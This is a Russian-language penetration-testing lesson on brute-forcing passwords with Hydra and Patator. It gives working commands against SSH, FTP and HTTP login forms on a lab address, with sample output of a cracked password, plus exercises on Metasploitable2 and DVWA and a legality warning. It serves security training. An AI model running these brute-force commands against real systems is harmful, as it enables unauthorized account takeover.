# Урок 36: Hydra и Patator — брутфорс паролей

## Теория

**Hydra** (THC Hydra) — классический инструмент для брутфорса паролей по сетевым протоколам. Поддерживает множество сервисов: SSH, FTP, HTTP, SMB, VNC, RDP и др.

**Patator** — более современный инструмент, написанный на Python. Меньше шумит, лучше обрабатывает ошибки, поддерживает многопоточность.

ВАЖНО: Используйте только на легальных целях (свои лаборатории, с разрешения владельца). Несанкционированный брутфорс — преступление.

## Практическое занятие

### Hydra

```bash
# Установка
sudo apt install hydra

# macOS (M2, Homebrew)
brew install hydra

# Проверка сервисов
hydra -U
# Пример вывода:
# Available services: asterisk cisco cisco-enable cvs firebird ftp ftps http http-form-get http-form-post http-get http-head https https-form-get https-form-post icq imap imaps irc ldap2 ldap3 ldaps mssql mysql nntp oracle oracle-listener pcanywhere pcnfs pop3 pop3s postgres rdp redis rexec rlogin rsh s7-300 sip smb smtp smtp-enum snmp socks5 ssh sshkey svn teamspot telnet vmauthd vnc xmpp

# Брутфорс SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
# Пример вывода:
# [DATA] attacking ssh://192.168.1.1:22/
# [22][ssh] host: 192.168.1.1   login: admin   password: password123

hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# Брутфорс FTP
hydra -l admin -P wordlist.txt ftp://192.168.1.1

# Брутфорс HTTP Form (POST)
hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Брутфорс HTTP Basic Auth
hydra -l admin -P wordlist.txt 192.168.1.1 http-get /admin/

# Настройка количества потоков
hydra -t 4 -l admin -P wordlist.txt ssh://192.168.1.1
```

### Параметры Hydra
```
-l — один логин
-L — файл со списком логинов
-p — один пароль
-P — файл с паролями
-t — количество потоков
-s — конкретный порт
-v — подробный вывод
-V — вывод каждой попытки
-f — остановиться при первом успехе
```

### Patator

```bash
# Установка
git clone https://github.com/lanjelot/patator.git
cd patator

# Брутфорс SSH
python3 patator.py ssh_login host=192.168.1.1 user=admin password=FILE0 0=/usr/share/wordlists/rockyou.txt
# Пример вывода:
# 192.168.1.1:22 ssh_login: 'admin' 'password123' 0

# Брутфорс FTP
python3 patator.py ftp_login host=192.168.1.1 user=admin password=FILE0 0=wordlist.txt

# Брутфорс HTTP
python3 patator.py http_fuzz url=http://192.168.1.1/admin.php method=POST body='user=admin&pass=FILE0' 0=wordlist.txt

# Настройка задержки (не спамить)
python3 patator.py ssh_login host=192.168.1.1 user=admin password=FILE0 0=wordlist.txt -x ignore:mesh='incorrect' delay=2
```


## Примеры вывода

Пример вывода команд будет добавлен индивидуально для каждого урока.



## Адаптация под macOS (M2, 8GB)

- Для установки инструментов используйте Homebrew: `brew install <tool>`
- На MacBook Air M2 (8GB) запускайте VM с памятью не более 3-4GB
- Используйте UTM вместо VirtualBox (лучшая поддержка ARM)
- Docker работает нативно на M2: `docker pull <image>`
- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
- Для Python используйте `pip3 install` вместо `pip install`


## Задачи для самостоятельного выполнения

1. Настройте Metasploitable2. Создайте пользователя с простым паролем. Используйте Hydra для брутфорса SSH. Удалось ли подобрать пароль?

2. Установите DVWA. Настройте форму логина. Используйте Hydra для брутфорса HTTP POST формы. Изучите, как определять успешный вход (параметр `:S=` или `:F=`).

3. Сравните Hydra и Patator на одной и той же задаче. Какой инструмент удобнее и почему?

4. Используйте маленький словарь (10 паролей) и попробуйте подобрать пароль для FTP на Metasploitable. Какой флаг показывает каждую попытку?

5. Напишите скрипт на Bash, который автоматически запускает Hydra с проверкой нескольких сервисов (SSH, FTP, Telnet) одного хоста.

## Частые ошибки

1. **Неправильный формат строки для HTTP форм в Hydra** — правильный синтаксис: `http-post-form "/path:params:F=fail_string"` или `:S=success_string`.

2. **Слишком много потоков (-t)** — большое количество потоков может привести к блокировке IP или зависанию сервиса.

3. **Отсутствие прав root для некоторых проверок** — Hydra не требует root, но некоторые сетевые настройки могут влиять.

4. **Игнорирование задержки (delay) в Patator** — без задержки можно быстро забрутфорсить сервис или получить бан.

## Вопросы на понимание

1. В чем разница между флагами `-l` и `-L` в Hydra?

2. Как определить строку успеха (success) и неудачи (fail) при брутфорсе HTTP форм?

3. Почему Patator считается более "тихим" инструментом, чем Hydra?

4. Что делает флаг `-f` в Hydra и когда его стоит использовать?


